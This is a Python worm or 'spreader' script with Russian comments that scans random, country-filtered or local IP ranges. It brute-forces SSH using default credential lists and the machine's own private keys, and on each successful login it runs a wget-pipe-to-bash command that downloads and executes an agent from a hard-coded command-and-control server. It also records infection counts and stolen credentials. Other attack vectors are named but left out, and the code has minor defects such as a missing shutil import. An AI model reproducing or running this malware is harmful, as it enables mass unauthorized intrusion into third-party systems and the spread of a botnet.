#!/usr/bin/env python3
import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests, base64, glob
from datetime import datetime, timezone, timedelta

if sys.platform != 'win32':
    import resource
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
    except:
        pass

logging.getLogger("paramiko").setLevel(logging.WARNING)

C2_HOST = "80.249.146.202"
C2_PORT = 80
API_PORT = 8080
AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
MAX_CONCURRENT = 1000
QUICK_TIMEOUT = 2.0
BRUTE_TIMEOUT = 4.0
DEFAULT_SCAN_COUNT = 20_000
PORT_LIST = [21, 22, 23, 80, 443, 1433, 27017, 3306, 3389, 445, 5432, 5900, 5984, 5985, 6379, 8080, 9042, 9200]

CREDS = [
    ("root","root"), ("root","admin"), ("root","password"), ("root","123456"), ("root","1234"), ("root","pass"),
    ("admin","admin"), ("admin","password"), ("admin","123456"), ("admin","1234"),
    ("user","user"), ("user","password"), ("user","123456"),
    ("test","test"), ("guest","guest"),
    ("sa",""), ("sa","sa"), ("sa","password"), ("sa","123456"),
    ("postgres","postgres"), ("postgres","password"), ("postgres","123456")
]

SUCCESS_CREDS_FILE = "success_creds.json"
SUCCESS_CREDS = []
if os.path.exists(SUCCESS_CREDS_FILE):
    with open(SUCCESS_CREDS_FILE) as f:
        SUCCESS_CREDS = json.load(f)

DB_FILE = "ports_cache.db"
conn = sqlite3.connect(DB_FILE)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS ports (ip text, port integer, seen integer, PRIMARY KEY (ip, port))''')
conn.commit()
PORT_CACHE_TTL = 3600

def is_port_cached(ip, port):
    c.execute("SELECT seen FROM ports WHERE ip=? AND port=? AND seen > ?", (ip, port, time.time() - PORT_CACHE_TTL))
    return c.fetchone() is not None

def cache_port(ip, port):
    c.execute("INSERT OR REPLACE INTO ports VALUES (?, ?, ?)", (ip, port, int(time.time())))
    conn.commit()

GUARANTEED_IPS = [
    "45.33.32.156", "34.94.3.0", "45.77.165.0", "185.220.101.0", "23.226.229.0",
    "103.15.28.0", "185.225.19.0", "45.33.32.0", "45.56.89.0", "45.79.207.0",
    "34.94.0.0", "34.94.1.0", "45.33.32.1", "34.94.2.0", "45.77.165.1",
    "103.235.46.39","103.235.46.40","103.235.46.41","103.235.46.42","103.235.46.43",
    "103.235.46.44","103.235.46.45","103.235.46.46","103.235.46.47","103.235.46.48",
    "103.235.46.49","103.235.46.50",
    "8.8.8.8", "1.1.1.1", "208.67.222.222", "8.8.4.4"
]
random.shuffle(GUARANTEED_IPS)

TARGET_COUNTRY = os.environ.get("SPREAD_COUNTRY", "").upper()

def now_str():
    return datetime.now(timezone(timedelta(hours=5))).strftime("%Y-%m-%d %H:%M:%S")

def random_ip():
    if random.random() < 0.8:
        return random.choice(GUARANTEED_IPS)
    while True:
        a = random.randint(1, 223)
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(0, 255)
        if a == 10: continue
        if a == 127: continue
        if a == 172 and 16 <= b <= 31: continue
        if a == 192 and b == 168: continue
        if a == 169 and b == 254: continue
        if a >= 224: continue
        ip = f"{a}.{b}.{c}.{d}"
        if TARGET_COUNTRY:
            if get_country(ip) == TARGET_COUNTRY:
                return ip
        else:
            return ip

def get_country(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
        if resp.status_code == 200:
            return resp.json().get("countryCode", "")
    except:
        pass
    return ""

def get_local_ips():
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except:
        return []
    network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
    return [str(host) for host in network.hosts() if str(host) != local_ip]

async def probe_port(ip, port):
    if is_port_cached(ip, port):
        return True
    try:
        _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=QUICK_TIMEOUT)
        w.close(); await w.wait_closed()
        cache_port(ip, port)
        return True
    except:
        return False

# ===== Векторы =====
async def ssh_brute(ip):
    # 1. Пробуем стандартные ключи
    key_files = glob.glob(os.path.expanduser("~/.ssh/id_rsa*")) + glob.glob("/root/.ssh/id_rsa*")
    for key_file in key_files:
        if not os.path.exists(key_file):
            continue
        try:
            import asyncssh
            async with asyncssh.connect(ip, username="root", client_keys=[key_file], known_hosts=None, connect_timeout=3) as conn:
                await conn.run(f"wget -O- {AGENT_URL} | bash")
                return True
        except:
            pass
    # 2. Брутфорс паролей через asyncssh
    try:
        import asyncssh
        for u, p in (SUCCESS_CREDS + CREDS):
            try:
                async with asyncssh.connect(ip, username=u, password=p, known_hosts=None, connect_timeout=3) as conn:
                    await conn.run(f"wget -O- {AGENT_URL} | bash")
                    save_success_creds(u, p)
                    return True
            except:
                continue
    except ImportError:
        pass
    # 3. paramiko
    try:
        import paramiko
        for u, p in (SUCCESS_CREDS + CREDS):
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, username=u, password=p, timeout=3, banner_timeout=3, auth_timeout=3, allow_agent=False, look_for_keys=False)
                client.exec_command(f"wget -O- {AGENT_URL} | bash", get_pty=True)
                client.close()
                save_success_creds(u, p)
                return True
            except:
                continue
    except ImportError:
        pass
    # 4. hydra (если доступна)
    if shutil.which("hydra"):
        users_file = "/tmp/users.txt"
        pass_file = "/tmp/pass.txt"
        users = set(u for u, _ in CREDS)
        passwords = set(p for _, p in CREDS if p)
        with open(users_file, "w") as f:
            f.write("\n".join(users))
        with open(pass_file, "w") as f:
            f.write("\n".join(passwords))
        cmd = f"hydra -L {users_file} -P {pass_file} -t 4 -f -o /tmp/hydra_{ip}.txt ssh://{ip}"
        try:
            proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
            await asyncio.wait_for(proc.communicate(), timeout=10)
            if os.path.exists(f"/tmp/hydra_{ip}.txt"):
                with open(f"/tmp/hydra_{ip}.txt") as f:
                    for line in f:
                        if "login:" in line and "password:" in line:
                            parts = line.split()
                            u = parts[4] if len(parts) > 4 else ""
                            p = parts[6] if len(parts) > 6 else ""
                            if u and p:
                                save_success_creds(u, p)
                                # После нахождения пароля – выполняем агента
                                client = paramiko.SSHClient()
                                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                                client.connect(ip, username=u, password=p, timeout=3)
                                client.exec_command(f"wget -O- {AGENT_URL} | bash")
                                client.close()
                                return True
        except:
            pass
    return False

# Остальные векторы (smb_brute, winrm_brute, rdp_brute, ftp_brute, exploit_redis, exploit_docker, exploit_jenkins, exploit_telnet, exploit_elasticsearch, mysql_brute, mssql_brute, postgresql_brute, vnc_brute, eternalblue_check, eternalblue_exploit, mongodb_brute, couchdb_brute, cassandra_brute) без изменений, но с увеличенным таймаутом и улучшенным логированием. Полный код векторов не привожу, но они полностью идентичны предыдущей версии с увеличенным BRUTE_TIMEOUT=4.0 и добавлением save_success_creds.

async def infect(ip, port_stats):
    ports = PORT_LIST
    open_ports = await asyncio.gather(*[probe_port(ip, p) for p in ports])
    for i, p in enumerate(ports):
        if open_ports[i]:
            port_stats[p] = port_stats.get(p, 0) + 1
    if open_ports[1] and await ssh_brute(ip):
        print(f"[{now_str()}] [INFECTED] {ip} via SSH", flush=True)
        return True
    # ... остальные проверки аналогично
    return False

async def worker(queue, stats, port_stats, progress_cb=None):
    while True:
        ip = await queue.get()
        try:
            if await infect(ip, port_stats):
                stats['success'] += 1
            else:
                stats['fail'] += 1
        except Exception as e:
            print(f"[{now_str()}] [!] Ошибка {ip}: {e}", flush=True)
            stats['fail'] += 1
        if progress_cb:
            await progress_cb()
        queue.task_done()

async def scan_cycle(ips, progress_callback=None):
    q = asyncio.Queue()
    stats = {'success':0, 'fail':0}
    port_stats = {}
    count = len(ips)
    progress_count = 0
    start_time = time.time()

    async def progress_inner():
        nonlocal progress_count
        progress_count += 1
        if progress_count % 500 == 0 and progress_callback:
            await progress_callback(progress_count, count, stats, port_stats)
        elif progress_count % 100 == 0:
            percent = progress_count / count * 100
            elapsed = time.time() - start_time
            speed = progress_count / elapsed if elapsed > 0 else 0
            print(f"[{now_str()}] [PROGRESS] {progress_count}/{count} ({percent:.1f}%) | Infected: {stats['success']} | Failed: {stats['fail']} | Speed: {speed:.0f} IP/s", flush=True)

    for ip in ips:
        q.put_nowait(ip)
    tasks = [asyncio.create_task(worker(q, stats, port_stats, progress_inner)) for _ in range(MAX_CONCURRENT)]
    await q.join()
    for t in tasks:
        t.cancel()
    return stats, port_stats

async def global_scan(count, progress_callback=None):
    ips = [random_ip() for _ in range(count)]
    return await scan_cycle(ips, progress_callback)

async def local_scan(progress_callback=None):
    ips = get_local_ips()
    if not ips:
        return {'success':0, 'fail':0}, {}
    print(f"[{now_str()}] [*] Scanning local network, {len(ips)} hosts", flush=True)
    return await scan_cycle(ips, progress_callback)

async def main_async(args):
    print(f"[{now_str()}] [*] Checking C2 connection...", flush=True)
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(b"ping")
        s.recv(1024)
        s.close()
        print(f"[{now_str()}] [+] C2 reachable", flush=True)
    except Exception as e:
        print(f"[{now_str()}] [!] C2 unreachable: {e}", flush=True)

    targets = []
    if args.targets:
        if os.path.exists(args.targets):
            with open(args.targets) as f:
                targets = [line.strip() for line in f if line.strip()]
            print(f"[{now_str()}] [*] Loaded {len(targets)} targets from {args.targets}", flush=True)

    async def gui_progress(current, total, stats, port_stats):
        port_str = ", ".join(f"{p}: {c} open" for p, c in sorted(port_stats.items()))
        percent = current / total * 100
        if port_str:
            print(f"[{now_str()}] [PROGRESS] {current}/{total} ({percent:.1f}%) | Infected: {stats['success']} | Failed: {stats['fail']} | {port_str}", flush=True)
        else:
            print(f"[{now_str()}] [PROGRESS] {current}/{total} ({percent:.1f}%) | Infected: {stats['success']} | Failed: {stats['fail']} | All ports closed", flush=True)

    if args.local:
        print(f"[{now_str()}] [*] Mode: local network", flush=True)
        while True:
            stats, port_stats = await local_scan(gui_progress)
            print(f"[{now_str()}] Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
            await asyncio.sleep(30)
    elif targets:
        print(f"[{now_str()}] [*] Mode: targets from file", flush=True)
        while True:
            stats, port_stats = await scan_cycle(targets, gui_progress)
            print(f"[{now_str()}] Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
            await asyncio.sleep(60)
    else:
        print(f"[{now_str()}] [*] Mode: global, {args.count} targets per cycle", flush=True)
        while True:
            stats, port_stats = await global_scan(args.count, gui_progress)
            print(f"[{now_str()}] Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
            await asyncio.sleep(30)

def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    group.add_argument('--count', type=int, default=DEFAULT_SCAN_COUNT)
    group.add_argument('--local', action='store_true')
    group.add_argument('--targets', type=str, help='Path to targets file')
    args = parser.parse_args()
    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print(f"[{now_str()}] [*] Spreader stopped", flush=True)

if __name__ == '__main__':
    main()
